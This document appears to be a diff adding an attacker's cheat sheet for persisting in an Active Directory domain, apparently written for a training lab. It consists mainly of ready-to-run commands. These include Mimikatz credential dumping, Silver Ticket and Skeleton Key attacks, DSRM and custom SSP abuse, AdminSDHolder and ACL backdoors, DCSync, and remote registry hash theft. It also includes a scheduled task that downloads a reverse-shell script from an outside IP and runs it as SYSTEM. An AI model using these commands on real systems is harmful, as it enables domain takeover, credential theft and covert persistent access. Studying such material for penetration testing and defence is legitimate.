@@ -1,0 +1,183 @@
+------------------Silver Ticket---------------------
+-Get the service user NTLM (DCORP-DC$ in this case):
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName *computername*
+
+--Generate a Silver Ticket:
+
+Invoke-Mimikatz -Command '"kerberos::golden /domain:DOMAIN /sid:SID /target:dcorp-dc.dollarcorp.moneycorp.local(targetComputer) /service:HOST/CIFS /rc4:NTLM /user:Administrator /ptt"'
+
+----
+
+-After generating a Silver Ticket (HOST - can schedule tasks):
+
+-Host the script trying to achieve (of course) and in this case it's Invoke-PowerShellTcp.ps1 (added the reverse function to the end of the script so it'll execute without importing the module)
+
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.71/Invoke-PowerShellTcp.ps1''')'"
+
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
+
+
+----------------Skeleton Key--(DANGEROUS)-(DANGEROUS FOR CLIENT/TARGET'S SECURITY)--------------------access users with 1 password
+
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcop-dc.dollarcorp.moneycorp.local
+
+Enter-PSSession -ComputerName *ComputerName* -Credential dcorp\Administrator
+
+
+------------------DSRM---(DANGEROUS)-(DANGEROUS FOR CLIENT/TARGET'S SECURITY------------------------
+
+DSRM is the "safe mode" of the DC, it goes this way usually when a server is promoted to DC.
+
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+-Compare the Administrator hash with the Administrator hash of below command :
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+[dcorp-dc]: PS C:\Users....> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose
+
+[dcorp-dc]: PS C:\Users....> Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
+
+can see the DsrmAdminLogonBehavior is set to 2, which means that we changed the logon type of the DSRM administrator hash
+
+Pass the Hash attack where the /domain:dcorp-dc (the DC hostname), with the DSRM Administrator's hash
+
+---------------CUSTOM SSP-------------------(DANGEROUS) and super fucking noisy
+
+
+SSP - Security Support Provider is a DLL which provides ways for an application to obtain an authenticated connection. SSP packages of microsoft are:
+
+--NTLM
+--Kerberos
+--Wdigest
+--CredSSO
+
+Mimikatz provides a custom SSP - mimilib.dll This SSP logs local logons, service account and machine account passwords in clear text on the target server.
+
+mimilib.dll is in the mimikatz repository
+
+```
+$packages = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
+$packages += "mimilib"
+Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
+Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages
+```
+2nd:
+
+```
+Invoke-Mimikatz -Command '"misc::memssp"'
+
+```
+
+----------------------AdminSDHolder---------------------
+
+Well known abuse of some of the Protected Groups - All of the below can log on locally to DC
+
+--Account Operators - Cannot modify DA/EA/BA groups. Can modify nested group within these groups.
+--Backup Operators - Backup GPO, edit to add SID of controlled account to a privileged group and Restore.
+--Server Operators - Run a command as system (using the disabled Browser Service)
+--Print Operators - Copy ntds.dit backup, load device drivers
+
+--PowerView--
+
+-With Domain Admin privileges
+
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student71 -Rights All(or ResetPassword/WriteMembers) -Verbose (or not -Verbose)
+
+-Triggering the SDPropagator on the DC
+
+$sess = New-PSSession -ComputerName dcorp-dc.......
+
+Invoke-Command -FilePath %PATH%\Invoke-SDPropagator.ps1 -Session $sess
+
+Enter-PSSession -Session $sess
+
+Invoke-SDPropagator
+
+-Checking the Domain Admins permissions -PowerView as a regular user
+
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student71'}
+
+-Abusing FullControl using PowerView_dev.ps1
+
+Add-DomainGroupMember -Identity 'Domain Admins' -Members anyuser -Verbose (or not -Verbose)
+
+----OUTPUT: "VERBOSE: [Add-DomainGroupMember] Adding member 'student71' to group 'Domain Admins'"
+
+-Check if the user got added to Domain Admins group
+
+net user *user* /domain
+
+*--Abusing ResetPassword using PowerView_dev.ps1
+
+Set-DomainUserPassword -Identity anyuser -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose (or not -Verbose)
+
+
+-------------Persistence using ACLs - Rights Abuse---------------
+
+Add FullControl rights:
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' (After being in the Domain Admins group, you can execute it from a regular PowerShell process, even not running as administrator)
+
+#Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName user -Rights All(DCSync too) -Verbose
+
+
+-------------Persistence using ACLs - Security Descriptors--------------
+
+
+-Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:
+--ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
+
+-ACE for built in administrators for WMI namespaces A;CI;CCDCLCSWRPWPRCWD;;;SID (every letter is a 'permission', and all of them combined grants full control over the namespace)
+
+----BA = Builtin Administrators
+
+Set-RemoteWMI.ps1
+
+ACLs can be modified to allow non-admin users access to securable objects
+-On local machine for student71:
+
+Set-RemoteWMI -UserName student71 -Verbose
+
+-On remote machine for student71 without explicit credentials:
+
+Set-RemoteWMI -UserName student71 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+
+-On remote machine WITH explicit credentials. Only root\cimv2 and nested namespaces:
+
+Set-RemoteWMI -UserName student71 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
+
+-On remote machine remove permissions:
+
+Set-RemoteWMI -UserName student71 -ComputerName dcrop-dc -namespace 'root\cimv2' -Remove -Verbose
+
+------------
+
+Set-RemotePSRemoting -UserName student71 -ComputerName dcorp-dc
+
+then from a non-privileged powershell session:
+
+Invoke-Command -ScriptBlock {whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+Now commands on the DC can run without even having any admin privileges window!!!
+
+--------Remote Registry
+
+Using DAMP, with admin privs on remote machine
+
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student71 -Verbose
+
+-As student71, retrieve machine account hash:
+
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+
+-Retrieve local account hash:
+
+Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+
+-Retrieve domain cached credentials:
+
+Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
